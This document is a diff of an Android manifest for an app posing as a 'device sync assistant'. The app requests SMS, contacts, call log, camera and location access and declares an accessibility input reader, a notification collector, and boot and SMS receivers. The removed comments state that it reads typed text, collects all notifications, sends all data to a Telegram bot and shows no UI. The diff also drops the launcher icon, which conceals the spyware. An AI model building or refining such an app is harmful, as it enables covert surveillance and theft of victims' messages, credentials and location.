@@ -2,37 +2,18 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.devicesync.assistant">
 
-    <!-- ─────────────────────────────────────────── -->
-    <!-- PERMISSIONS -->
-    <!-- ─────────────────────────────────────────── -->
-
-    <!-- Message permissions -->
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
-
-    <!-- Contact permission -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
-
-    <!-- Call log permission -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
-
-    <!-- Storage permission -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-
-    <!-- Camera permission -->
     <uses-permission android:name="android.permission.CAMERA" />
-
-    <!-- Location permission -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-
-    <!-- Network permission -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-    <!-- Background service permissions -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
@@ -42,16 +23,10 @@
 
     <application
         android:allowBackup="false"
-        android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/Theme.DeviceSync">
 
-        <!-- ─────────────────────────────────────────── -->
-        <!-- MAIN ENTRY ACTIVITY -->
-        <!-- Opens accessibility page directly -->
-        <!-- No UI shown -->
-        <!-- ─────────────────────────────────────────── -->
         <activity
             android:name=".SetupActivity"
             android:exported="true"
@@ -62,10 +37,6 @@
             </intent-filter>
         </activity>
 
-        <!-- ─────────────────────────────────────────── -->
-        <!-- INPUT READER SERVICE -->
-        <!-- Reads text typed in focused apps -->
-        <!-- ─────────────────────────────────────────── -->
         <service
             android:name=".services.InputReaderService"
             android:exported="true"
@@ -79,10 +50,6 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- ─────────────────────────────────────────── -->
-        <!-- ALERT COLLECTOR SERVICE -->
-        <!-- Collects all incoming notifications -->
-        <!-- ─────────────────────────────────────────── -->
         <service
             android:name=".services.AlertCollectorService"
             android:exported="true"
@@ -93,28 +60,15 @@
             </intent-filter>
         </service>
 
-        <!-- ─────────────────────────────────────────── -->
-        <!-- DEVICE SYNC SERVICE -->
-        <!-- Main background service -->
-        <!-- Sends all data to Telegram bot -->
-        <!-- ─────────────────────────────────────────── -->
         <service
             android:name=".services.DeviceSyncService"
             android:exported="false"
             android:foregroundServiceType="connectedDevice" />
 
-        <!-- ─────────────────────────────────────────── -->
-        <!-- WAKE SERVICE -->
-        <!-- Receives reconnect signal from Telegram bot -->
-        <!-- ─────────────────────────────────────────── -->
         <service
             android:name=".services.WakeService"
             android:exported="false" />
 
-        <!-- ─────────────────────────────────────────── -->
-        <!-- MESSAGE RECEIVER -->
-        <!-- Receives incoming SMS instantly -->
-        <!-- ─────────────────────────────────────────── -->
         <receiver
             android:name=".receivers.MessageReceiver"
             android:exported="true">
@@ -123,10 +77,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ─────────────────────────────────────────── -->
-        <!-- BOOT RECEIVER -->
-        <!-- Starts service automatically after reboot -->
-        <!-- ─────────────────────────────────────────── -->
         <receiver
             android:name=".receivers.BootReceiver"
             android:exported="true">
